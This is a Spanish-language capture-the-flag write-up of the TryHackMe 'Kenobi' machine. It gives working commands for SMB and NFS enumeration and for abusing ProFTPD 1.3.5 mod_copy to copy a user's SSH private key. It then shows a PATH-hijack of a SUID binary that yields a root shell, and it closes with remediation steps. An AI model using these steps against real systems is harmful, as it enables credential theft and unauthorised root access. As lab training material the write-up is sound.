# Write-up: Kenobi (TryHackMe)

**Autor:** Juan Merino Garrido
**Plataforma:** TryHackMe
**Máquina:** Kenobi
**Dificultad:** Fácil

Este documento detalla el proceso de enumeración, explotación y escalada de privilegios en la máquina "Kenobi" de TryHackMe.

---

## 1. Reconocimiento y Escaneo

La fase inicial fue el reconocimiento. Se utilizó `nmap` para identificar los servicios expuestos en la máquina (`10.10.10.70`).

**Comando:**
```bash
nmap -p- --min-rate 5000 -sCV -n -Pn 10.10.10.70
````

**Resultados Clave:**

  * **21/tcp:** ProFTPD 1.3.5
  * **22/tcp:** OpenSSH 8.2p1
  * **80/tcp:** Apache httpd 2.4.41
  * **139/445/tcp:** Samba smbd
  * **111/2049/tcp:** NFS/RPC

-----

## 2\. Enumeración

Con los servicios identificados, se procedió a enumerar los más prometedores.

### Samba (SMB)

Se utilizó `smbclient -L //10.10.10.70` para listar los recursos compartidos. Se descubrió un recurso `[anonymous]` accesible sin contraseña.

### NFS (Network File System)

Se utilizó `showmount -e 10.10.10.70` para listar los recursos compartidos de NFS. Se descubrió que el directorio `/var` estaba siendo compartido públicamente (`*`).

-----

## 3\. Obtención de Acceso

### Análisis de Archivos

Al conectarse al recurso SMB `[anonymous]` (`smbclient //10.10.10.70/anonymous`), se encontró un archivo `log.txt`.

El análisis de `log.txt` reveló tres pistas cruciales:

1.  La existencia del usuario `kenobi`.
2.  La ubicación de su clave SSH: `/home/kenobi/.ssh/id_rsa`.
3.  La configuración de ProFTPD, que se ejecuta como el usuario `kenobi`.

### Explotación Combinada (NFS + FTP)

El plan fue usar la vulnerabilidad `mod_copy` (presente en ProFTPD 1.3.5) para copiar la clave SSH (`id_rsa`) a un directorio escribible que controláramos.

1.  **Montaje de NFS:** Se montó el directorio `/var` del servidor en la máquina local:
    ```bash
    sudo mount 10.10.10.70:/var /tmp/kenobi-var
    ```
2.  **Explotación `mod_copy`:** Se usó `telnet` para enviar comandos FTP al servidor y copiar la clave en el directorio `/var/tmp`, que ahora era accesible localmente.
    ```bash
    $ telnet 10.10.10.70 21
    SITE CPFR /home/kenobi/.ssh/id_rsa
    SITE CPTO /var/tmp/id_rsa
    ```
3.  **Obtención de Clave:** El archivo `id_rsa` apareció en el directorio montado (`/tmp/kenobi-var/tmp/id_rsa`).

-----

## 4\. Obtención de Acceso (Shell)

Se copió la clave `id_rsa` a la máquina local, se corrigieron sus permisos (`chmod 600`) y se utilizó para iniciar sesión vía SSH.

```bash
ssh -i ~/.ssh/kenobi_id_rsa kenobi@10.10.10.70
```

Se obtuvo acceso como el usuario `kenobi`.

-----

## 5\. Escalada de Privilegios

### Búsqueda de Vectores

Se buscaron binarios con el bit SUID (`find / -perm -u=s -type f 2>/dev/null`). Se identificó un binario no estándar y sospechoso: `/usr/bin/menu`.

### Análisis del Binario

Usando `strings /usr/bin/menu`, se descubrió que el programa ejecutaba comandos (`curl`, `uname`, `ifconfig`) sin sus rutas absolutas. Esto lo hace vulnerable a "Path Hijacking".

### Explotación (Secuestro de PATH)

Se creó un script malicioso llamado `curl` en un directorio escribible (`/tmp`) que, en lugar de contactar localhost, ejecutaba una shell (`/bin/bash`).

1.  **Crear payload:** `echo /bin/bash > /tmp/curl`
2.  **Dar permisos:** `chmod +x /tmp/curl`
3.  **Envenenar el PATH:** `export PATH=/tmp:$PATH`
4.  **Ejecutar SUID:** `/usr/bin/menu`
5.  **Activar payload:** Se seleccionó la opción `1` (que ejecuta `curl`).

El sistema (ejecutándose como `root`) buscó `curl`, encontró `/tmp/curl` primero y ejecutó `/bin/bash`, otorgando una shell de `root`.

**Resultado Final:**

```
root@kenobi:~# whoami
root
root@kenobi:~# id
uid=0(root) gid=1000(kenobi) ...
```

-----

## 6\. Conclusiones y Remediación

  * **Vulnerabilidad Inicial:** La configuración incorrecta de SMB y NFS permitió el acceso inicial a archivos sensibles.
  * **Vulnerabilidad Crítica:** La versión obsoleta de `ProFTPD 1.3.5` (vulnerable a `mod_copy`) permitió el robo de credenciales (clave SSH).
  * **Vector de Escalada:** El binario SUID `/usr/bin/menu` con la vulnerabilidad de "Path Hijacking" permitió la escalada de privilegios.
  * **Solución:**
    1.  Actualizar ProFTPD a una versión moderna.
    2.  Restringir los permisos en los recursos compartidos de SMB y NFS.
    3.  Eliminar el bit SUID de `/usr/bin/menu` o, preferiblemente, eliminar el binario.
    4.  Reforzar el código del binario para que utilice rutas absolutas (ej. `/usr/bin/curl`).

<!-- end list -->

```
---
